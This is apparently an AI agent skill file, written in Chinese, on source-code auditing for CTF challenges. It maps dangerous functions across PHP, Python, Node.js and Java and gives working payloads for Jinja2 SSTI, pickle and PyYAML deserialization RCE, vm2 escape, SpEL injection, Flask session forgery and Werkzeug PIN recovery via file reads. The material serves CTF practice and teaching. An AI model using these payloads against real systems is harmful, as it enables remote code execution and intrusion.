---
name: ctf-source-audit
description: "CTF 挑战中的源码审计方法。当发现 .git 目录、.bak/.zip 备份、/proc/self/environ 泄露源码时使用。与真实代码审计不同——CTF 源码中的漏洞是故意设置的，通常只有 1-2 个关键点。先找危险函数（sink），再追溯输入（source）到该函数的路径。覆盖 PHP/Python/Node.js/Java 四种语言的危险函数和漏洞模式"
metadata:
  tags: "ctf,source,audit,code review,源码审计,php,python,node,java,代码审计,SAST"
  category: "ctf"
---

# CTF 源码审计方法论

CTF 源码审计 ≠ 真实代码审计。区别：
- 真实审计：几万行代码，漏洞可能在任何地方
- CTF 审计：**几十到几百行代码，漏洞是故意设置的，通常很明显**

核心策略：**找危险函数**（sink），然后追溯输入（source）到危险函数的路径。

## ⛔ 深入参考（必读）

- PHP/Python/Node.js/Java 完整危险函数清单、漏洞模式 → [references/dangerous-functions.md](references/dangerous-functions.md)

## Phase 1: 快速识别语言和框架

| 特征 | 语言/框架 |
|------|-----------|
| `.php` 文件、`<?php` | PHP |
| `app.py`、`from flask`、`import django` | Python (Flask/Django) |
| `package.json`、`require()`、`app.js` | Node.js (Express) |
| `pom.xml`、`.java`、`@Controller` | Java (Spring) |
| `go.mod`、`func main()` | Go |

## Phase 2: 审计流程

### 2.1 快速定位危险函数

| 语言 | 命令执行 | 反序列化 | 模板注入 | 文件操作 |
|------|----------|----------|----------|----------|
| PHP | `system()` `eval()` `exec()` `passthru()` | `unserialize()` | N/A | `include()` `file_get_contents()` |
| Python | `os.system()` `eval()` `exec()` `subprocess` | `pickle.loads()` `yaml.load()` | `render_template_string()` | `open()` |
| Node.js | `child_process.exec()` `eval()` | N/A | EJS/Pug inject | `fs.readFile()` |
| Java | `Runtime.exec()` `ProcessBuilder` | `ObjectInputStream` | SpEL/FreeMarker | `FileInputStream` |

→ 完整危险函数清单 → [references/dangerous-functions.md](references/dangerous-functions.md)

### 2.2 追踪数据流（sink → source）

1. **参数从哪来？** — `$_GET`, `request.args`, `req.body`, `@RequestParam`
2. **有没有过滤？** — 搜 `filter`, `sanitize`, `escape`, `replace`, `blacklist`
3. **过滤能绕过吗？** — CTF 中通常有绕过（黑名单遗漏、双重编码、大小写、数组绕过）

### 2.3 审计产出
1. 漏洞类型和位置（文件名+行号）
2. 利用方法（构造什么请求触发）
3. Flag 获取路径

## Phase 3: PHP 常见漏洞模式

### 弱比较 (`==` vs `===`)

```php
// 0e 开头的字符串在 == 比较时被当作科学计数法，等于 0
if ($_GET['password'] == '0e123456') { ... }  // 输入 "0" → true
if (md5($a) == md5($b)) { ... }  // 找两个 md5 以 0e 开头的值

// 0e MD5 碰撞值：
// md5("240610708")  = 0e462097431906509019562988736854
// md5("QNKCDZO")    = 0e830400451993494058024219903391
// md5("s878926199a") = 0e545993274517709034328855841020

// 数组绕过 ===
if ($a != $b && md5($a) === md5($b)) { ... }
// md5(array) 返回 NULL → a[]=1&b[]=2
```

### 变量覆盖

```php
extract($_GET);  // GET 参数覆盖任意变量
parse_str($str); // 解析字符串为变量（无第二个参数时）
$$key = $value;  // 可变变量

// 利用：?admin=1 覆盖 $admin 变量
```

### PHP 类型戏法

```php
// intval() 截断
intval("123abc") === 123  // 非数字部分被忽略
intval("0x1A") === 0      // PHP 7 不解析 hex（PHP 5 可以）

// is_numeric() 绕过
is_numeric("0x539") → true (PHP 5)
is_numeric("1e5") → true   // 科学计数法

// in_array() 松散比较
in_array(0, ['a','b','c']) → true  // 0 == 'a' 在松散比较中为 true（PHP 7 以下）
// 修复：in_array(0, ['a','b','c'], true) 第三个参数=strict
```

### preg_replace /e (PHP < 7.0)

```php
preg_replace('/.*/e', 'system("id")', '');  // /e 修饰符执行替换结果
```

### 反序列化 POP 链

搜索 `__wakeup()`, `__destruct()`, `__toString()` 魔术方法，构造链式调用。

```php
// __wakeup 绕过：序列化字符串中属性个数大于实际值
O:4:"User":3:{...}  // 实际只有 2 个属性，写 3 → 跳过 __wakeup
// 适用 PHP 5.x - 7.0.10
```

## Phase 4: Python 常见漏洞模式

### Flask Session 伪造

```python
# 如果知道 SECRET_KEY，可以伪造 Flask session
# 工具：flask-unsign
flask-unsign --decode --cookie 'SESSION_COOKIE'
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'SECRET_KEY'

# SECRET_KEY 泄露路径：
# - 源码中硬编码
# - /proc/self/environ 中的环境变量
# - config.py / .env 文件
```

### Werkzeug Debug PIN 计算

```python
# 当 Flask DEBUG=True 时，/console 需要 PIN
# PIN 计算因素（全部可通过 LFI 获取）：
# 1. username: /etc/passwd 中运行 Flask 的用户
# 2. modname: 通常是 "flask.app"
# 3. appname: 通常是 "Flask"
# 4. modpath: flask/app.py 的路径 → /proc/self/cmdline + find
# 5. MAC 地址: /sys/class/net/eth0/address → 转十进制
# 6. machine-id: /etc/machine-id + /proc/self/cgroup (Docker)

# 计算脚本见 ctf-web-methodology 的 server-side-advanced.md
```

### SSTI (Jinja2)

```python
render_template_string(user_input)  # 危险！
# 检测：{{7*7}} → 49
# RCE：{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Pickle 反序列化 RCE

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

### PyYAML 不安全加载

```python
yaml.load(data)  # 不安全！需要 yaml.safe_load()
# payload: !!python/object/apply:os.system ['cat /flag.txt']
```

## Phase 5: Node.js 常见漏洞模式

### 原型链污染

```javascript
// 危险函数：Object.assign(), _.merge(), _.set(), 递归合并
// payload: {"__proto__":{"isAdmin":true}}
// 或: {"constructor":{"prototype":{"isAdmin":true}}}

// 利用场景：
// 1. 修改 Object.prototype 影响全局
// 2. 覆盖已有属性（role: admin）
// 3. RCE：污染 child_process 的 env/shell
```

### require() 路径穿越

```javascript
// 如果用户控制 require() 参数
require('../../../etc/passwd');  // 虽然不执行但可泄露错误信息
require('/proc/self/environ');
```

### eval() / vm 逃逸

```javascript
// vm2 沙箱逃逸（多个 CVE）
const {VM} = require("vm2");
const vm = new VM();
vm.run('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()');
```

## Phase 6: Java 常见漏洞模式

### SpEL 注入 (Spring)

```java
// 如果用户输入被嵌入 SpEL 表达式
// 检测：${7*7} → 49 或 #{7*7} → 49
// RCE：
#{T(java.lang.Runtime).getRuntime().exec("id")}
```

### XXE (Java XML 解析)

Java 的 XML 解析器默认不禁用外部实体（需要手动设置），是 XXE 高发区。

### 反序列化（ObjectInputStream）

搜索 `ObjectInputStream.readObject()` → 配合 ysoserial 生成 payload。

## 注意事项

- CTF 源码通常很短（<200行），不要用复杂工具，手动审计即可
- 优先搜索 `flag`、`secret`、`admin` 关键字
- 注意注释中的提示（CTF 出题者有时会留线索）
- 多文件项目：先看路由（`app.py` / `index.php` / `app.js`），再看控制器逻辑
